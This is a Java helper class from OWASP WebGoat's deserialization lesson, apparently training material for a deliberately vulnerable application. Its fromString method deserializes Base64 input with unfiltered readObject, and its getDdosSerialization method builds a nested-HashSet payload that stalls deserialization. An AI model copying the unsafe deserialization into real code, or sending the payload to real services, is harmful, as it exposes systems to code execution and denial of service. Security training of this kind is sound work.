package org.owasp.webgoat.deserialization;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;
import java.util.HashSet;
import java.util.Set;

public class SerializationHelper {
	
	private final static char[] hexArray = "0123456789ABCDEF".toCharArray();
	
    public static Object fromString( String s ) throws IOException ,
            ClassNotFoundException {
        byte [] data = Base64.getDecoder().decode( s );
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(  data ) );
        Object o  = ois.readObject();
        ois.close();
        return o;
    }

    public static String toString( Serializable o ) throws IOException {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream( baos );
        oos.writeObject( o );
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    public static String show() throws IOException {
    	ByteArrayOutputStream baos = new ByteArrayOutputStream();
    	DataOutputStream dos = new DataOutputStream(baos);
    	dos.writeLong(-8699352886133051976L);
    	dos.close();
    	byte[] longBytes = baos.toByteArray();
    	return bytesToHex(longBytes);
    }
    
    public static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for ( int j = 0; j < bytes.length; j++ ) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = hexArray[v >>> 4];
            hexChars[j * 2 + 1] = hexArray[v & 0x0F];
        }
        return new String(hexChars);
    }

	public static String getDdosSerialization() throws IOException {
		Set root = new HashSet();
    	Set s1 = root;
    	Set s2 = new HashSet();
    	for (int i = 0; i < 100; i++) {
    	  Set t1 = new HashSet();
    	  Set t2 = new HashSet();
    	  t1.add("foo"); // make it not equal to t2
    	  s1.add(t1);
    	  s1.add(t2);
    	  s2.add(t1);
    	  s2.add(t2);
    	  s1 = t1;
    	  s2 = t2;
    	}
    	return toString((Serializable) root);
	}
	
}
